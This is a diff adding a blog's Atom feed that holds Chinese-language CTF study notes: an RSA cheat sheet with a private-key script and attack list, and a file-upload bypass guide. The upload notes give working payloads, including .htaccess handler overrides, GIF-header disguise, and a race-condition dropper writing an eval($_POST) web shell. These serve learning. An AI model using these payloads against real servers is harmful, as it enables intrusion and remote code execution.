@@ -1,0 +1,93 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>Lazzaro</title>
+  
+  
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="http://yoursite.com/"/>
+  <updated>2020-05-06T14:48:49.690Z</updated>
+  <id>http://yoursite.com/</id>
+  
+  <author>
+    <name>Lazzaro</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>to-do</title>
+    <link href="http://yoursite.com/2020/05/06/to-do/"/>
+    <id>http://yoursite.com/2020/05/06/to-do/</id>
+    <published>2020-05-06T14:48:39.000Z</published>
+    <updated>2020-05-06T14:48:49.690Z</updated>
+    
+    <content type="html"><![CDATA[<!-- build time:Wed May 06 2020 22:49:18 GMT+0800 (GMT+08:00) --><p>1.文章目录<br>2.美化</p><!-- rebuild by neat -->]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;!-- build time:Wed May 06 2020 22:49:18 GMT+0800 (GMT+08:00) --&gt;&lt;p&gt;1.文章目录&lt;br&gt;2.美化&lt;/p&gt;&lt;!-- rebuild by neat --&gt;
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>RSA</title>
+    <link href="http://yoursite.com/2020/05/06/RSA/"/>
+    <id>http://yoursite.com/2020/05/06/RSA/</id>
+    <published>2020-05-06T14:15:00.000Z</published>
+    <updated>2020-05-06T14:47:19.920Z</updated>
+    
+    <content type="html"><![CDATA[<!-- build time:Wed May 06 2020 22:49:18 GMT+0800 (GMT+08:00) --><h4><span id="chang-yong-gong-ju"> 常用工具</span><a href="#chang-yong-gong-ju" class="header-anchor">#</a></h4><ul><li><p>rsatool <a href="https://github.com/ius/rsatool" target="_blank" rel="noopener">https://github.com/ius/rsatool</a></p></li><li><p>分解大素数</p><p>factordb <a href="http://www.factordb.com/" target="_blank" rel="noopener">http://www.factordb.com</a></p><p>yafu</p></li><li><p>Openssl</p><p>解析加密密钥：</p><blockquote><p>openssl rsa -pubin -text -modulus -in pub.key</p></blockquote><p>生成解密密钥：</p><blockquote><p>python <a href="http://rsatool.py" target="_blank" rel="noopener">rsatool.py</a> -f PEM -o key.key -p 1 -q 1 -e 1</p><p>openssl rsautl -decrypt -inkey key.pem -in flag.enc -out flag</p></blockquote><p>脚本生成解密密钥：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"> </span><br><span class="line">keypair = RSA.generate(<span class="number">1024</span>)</span><br><span class="line">keypair.p =</span><br><span class="line">keypair.q =</span><br><span class="line">keypair.e =</span><br><span class="line">keypair.n = keypair.p * keypair.q</span><br><span class="line">Qn = long((keypair.p - <span class="number">1</span>) * (keypair.q - <span class="number">1</span>))</span><br><span class="line"> </span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">    x = (Qn * i) + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (x % keypair.e == <span class="number">0</span>):</span><br><span class="line">        keypair.d = x / keypair.e</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">private = open(<span class="string">'private.pem'</span>, <span class="string">'w'</span>)</span><br><span class="line">private.write(keypair.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure></li></ul><h4><span id="rsa-tao-lu"> RSA套路</span><a href="#rsa-tao-lu" class="header-anchor">#</a></h4><ol><li><h5><span id="gei-p-q-e-c"> 给p,q,e,c</span><a href="#gei-p-q-e-c" class="header-anchor">#</a></h5></li><li><h5><span id="gei-n-e-dp-c"> 给n,e,dp,c</span><a href="#gei-n-e-dp-c" class="header-anchor">#</a></h5></li><li><h5><span id="gei-p-q-dp-dq-c"> 给p,q,dp,dq,c</span><a href="#gei-p-q-dp-dq-c" class="header-anchor">#</a></h5></li><li><h5><span id="di-jie-mi-zhi-shu-gong-ji-e-chang-du-jiao-da"> 低解密指数攻击（e长度较大）</span><a href="#di-jie-mi-zhi-shu-gong-ji-e-chang-du-jiao-da" class="header-anchor">#</a></h5></li><li><h5><span id="gong-mo-gong-ji-n-m-xiang-tong-c-e-bu-tong"> 共模攻击（n,m相同，c,e不同）</span><a href="#gong-mo-gong-ji-n-m-xiang-tong-c-e-bu-tong" class="header-anchor">#</a></h5></li><li><h5><span id="e-m-xiang-tong-duo-ge-n-zhong-cun-zai-liang-ge-n-you-gcd"> e,m相同，多个n中存在两个n有GCD</span><a href="#e-m-xiang-tong-duo-ge-n-zhong-cun-zai-liang-ge-n-you-gcd" class="header-anchor">#</a></h5></li><li><h5><span id="coppersmith-gong-ji-bu-fen-p-huo-q"> coppersmith攻击（部分p或q）</span><a href="#coppersmith-gong-ji-bu-fen-p-huo-q" class="header-anchor">#</a></h5></li></ol><!-- rebuild by neat -->]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;!-- build time:Wed May 06 2020 22:49:18 GMT+0800 (GMT+08:00) --&gt;&lt;h4&gt;&lt;span id=&quot;chang-yong-gong-ju&quot;&gt; 常用工具&lt;/span&gt;&lt;a href=&quot;#chang-yong-gong-ju&quot;
+      
+    
+    </summary>
+    
+    
+      <category term="crypto" scheme="http://yoursite.com/categories/crypto/"/>
+    
+    
+      <category term="RSA" scheme="http://yoursite.com/tags/RSA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>文件上传</title>
+    <link href="http://yoursite.com/2020/05/06/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    <id>http://yoursite.com/2020/05/06/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
+    <published>2020-05-06T13:13:00.000Z</published>
+    <updated>2020-05-06T14:28:01.178Z</updated>
+    
+    <content type="html"><![CDATA[<!-- build time:Wed May 06 2020 22:49:18 GMT+0800 (GMT+08:00) --><h3><span id="rao-guo-zi-shi"> <u>绕过姿势</u></span><a href="#rao-guo-zi-shi" class="header-anchor">#</a></h3><h4><span id="ke-hu-duan-xiao-yan"> 客户端校验</span><a href="#ke-hu-duan-xiao-yan" class="header-anchor">#</a></h4><ol><li><h5><span id="jin-yong-js"> 禁用JS</span><a href="#jin-yong-js" class="header-anchor">#</a></h5></li><li><h5><span id="zhua-bao-gai-bao"> 抓包改包</span><a href="#zhua-bao-gai-bao" class="header-anchor">#</a></h5><p>bp抓包后改后缀名</p></li></ol><h4><span id="fu-wu-duan-xiao-yan"> 服务端校验</span><a href="#fu-wu-duan-xiao-yan" class="header-anchor">#</a></h4><ol><li><h5><span id="mime-lei-xing-jian-ce"> MIME类型检测</span><a href="#mime-lei-xing-jian-ce" class="header-anchor">#</a></h5><p>MIME类型在html文件中使用<code>content-type</code>属性表示</p><ul><li>php举例：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">"upfile"</span>][<span class="string">"type"</span>]!=<span class="string">"image/gif"</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"只允许上传图片"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>常见文件名对应的MIME类型</p><table><thead><tr><th style="text-align:center">扩展名</th><th style="text-align:center">MIME类型</th></tr></thead><tbody><tr><td style="text-align:center">gif</td><td style="text-align:center">image/gif</td></tr><tr><td style="text-align:center">png</td><td style="text-align:center">image/png</td></tr><tr><td style="text-align:center">jpg</td><td style="text-align:center">image/jpg</td></tr><tr><td style="text-align:center">js</td><td style="text-align:center">text/javascript</td></tr><tr><td style="text-align:center">htm</td><td style="text-align:center">text/html</td></tr><tr><td style="text-align:center">html</td><td style="text-align:center">text/html</td></tr></tbody></table></li><li><p>绕过方法</p><p>抓包改content-type字段</p><p>改文件名后上传抓包后再改回文件名</p><p>上传正常文件改文件内容…</p></li></ul></li><li><h5><span id="hou-zhui-ming-hei-ming-dan-xiao-yan"> 后缀名黑名单校验</span><a href="#hou-zhui-ming-hei-ming-dan-xiao-yan" class="header-anchor">#</a></h5><ul><li><p>绕过方法</p><ul><li><p>大小写绕过，例如Php、PhP</p></li><li><p>利用黑名单中没有的，但是又能够被解析的后缀名，例如<code>php、php3、php4、php5、php7、pht、phtml、phps</code></p></li><li><p>00截断</p><p>注：需要magic_quotes_gpc=Off，基于一个组合逻辑漏洞</p><p>在第一个后缀名后加一个空格(<code>0x20</code>)，使用bp-&gt;repeater-&gt;hex，将其改成<code>0x00</code></p></li><li><p>.htaccess文件上传解析<br>该文件可以理解为Apache的分布式配置文件，在一个特定的文档中放置，以作用于此目录及其所有子目录。管理员可以通过Apache的AllowOverride指令来设置<code>/etc/apache2/apache2.conf</code>，默认是NONE，需要为ALL</p><img src="https://img2018.cnblogs.com/blog/1270588/201906/1270588-20190608001655034-1813168060.jpg" alt="img" style="zoom:67%"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;xxx.jpg&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMacth&gt;</span><br></pre></td></tr></table></figure><p>不能写<code>&lt;?</code>时使用伪协议：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .xxx</span><br><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;shell.xxx&quot;</span><br></pre></td></tr></table></figure><p>不能出现某些关键字（如<code>ph</code>或<code>php</code>）时，使用反斜杠（<code>\</code>）拼接绕过，并开启短标签：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-p\</span><br><span class="line">hp .jpg</span><br><span class="line">p\</span><br><span class="line">hp_value au\to_append_file &quot;p\</span><br><span class="line">hp:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;shell.jpg&quot;</span><br><span class="line">p\</span><br><span class="line">hp_value short_open_tag 1</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><h5><span id="hou-zhui-ming-bai-ming-dan-xiao-yan"> 后缀名白名单校验</span><a href="#hou-zhui-ming-bai-ming-dan-xiao-yan" class="header-anchor">#</a></h5><ul><li><p>配合Apache的解析缺陷</p><p>Apache的解析漏洞主要特性是从后面开始检查后缀，按最后一个合法后缀</p></li></ul></li><li><h5><span id="nei-rong-tou-xiao-yan"> 内容头校验</span><a href="#nei-rong-tou-xiao-yan" class="header-anchor">#</a></h5><ul><li><p>绕过方法</p><p>在恶意脚本前加上允许上传文件的头标识</p><img src="https://img2018.cnblogs.com/blog/1270588/201906/1270588-20190608001745984-703396364.png" alt="img" style="zoom:67%"><p>如添加GIF头：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><h5><span id="jing-zheng-shang-chuan"> 竞争上传</span><a href="#jing-zheng-shang-chuan" class="header-anchor">#</a></h5><ul><li><p>情景</p><p>文件上传后，检测是否合法，不合法就删除</p></li><li><p>利用方式</p><p>在删除前访问到上传的文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = <span class="string">'web.php'</span>;</span><br><span class="line">$shell = <span class="string">'&lt;?php eval($_POST["key"])?&gt;'</span>;</span><br><span class="line">file_put_contents($file,$shell);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>例子</p><p><a href="https://github.com/backlion/demo/blob/master/lfi_phpinfo.py" target="_blank" rel="noopener">https://github.com/backlion/demo/blob/master/lfi_phpinfo.py</a></p></li></ul></li><li><h5><span id="php-beng-kui-dao-zhi-tmp-wen-jian-bao-liu"> php崩溃导致tmp文件保留</span><a href="#php-beng-kui-dao-zhi-tmp-wen-jian-bao-liu" class="header-anchor">#</a></h5><p>当存在<code>include</code>的时候，传入<code>file=php://filter/string.strip_tags/resource=/etc/passwd</code>会导致<code>Segment Fault</code>，这样如果在此同时上传文件，那么临时文件就会被保存在<code>/tmp</code>目录，不会被删除。但是这时还需要知道<code>/tmp</code>目录下的文件名。</p></li><li><h5><span id="guo-lu-lt-huo-php"> 过滤<code>&lt;?</code>或<code>php</code></span><a href="#guo-lu-lt-huo-php" class="header-anchor">#</a></h5><ul><li><p>js标签绕过</p><p>需要php小于7.0</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"PHP"</span>&gt;</span><br><span class="line">$fh=fopen(<span class="string">"../flag."</span>.strtolower(<span class="string">"PHP"</span>),<span class="string">'r'</span>);</span><br><span class="line">echo fread($fh,filesize(<span class="string">"../flag."</span>.strtolower(<span class="string">"PHP"</span>)));</span><br><span class="line">fclose($fh);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>PHP短标签</p><p>开启短标签即<code>short_open_tag=on</code>时，可以使用<code>&lt;?=$_ ?&gt;</code>输出变量，在PHP 5.4 之后默认支持</p><p><img src="https://img2018.cnblogs.com/blog/1270588/202002/1270588-20200227205858878-1841856625.png" alt="img"></p></li></ul></li></ol><!-- rebuild by neat -->]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;!-- build time:Wed May 06 2020 22:49:18 GMT+0800 (GMT+08:00) --&gt;&lt;h3&gt;&lt;span id=&quot;rao-guo-zi-shi&quot;&gt; &lt;u&gt;绕过姿势&lt;/u&gt;&lt;/span&gt;&lt;a href=&quot;#rao-guo-zi-shi&quot; 
+      
+    
+    </summary>
+    
+    
+      <category term="web" scheme="http://yoursite.com/categories/web/"/>
+    
+    
+      <category term="文件上传" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    
+  </entry>
+  
+</feed>
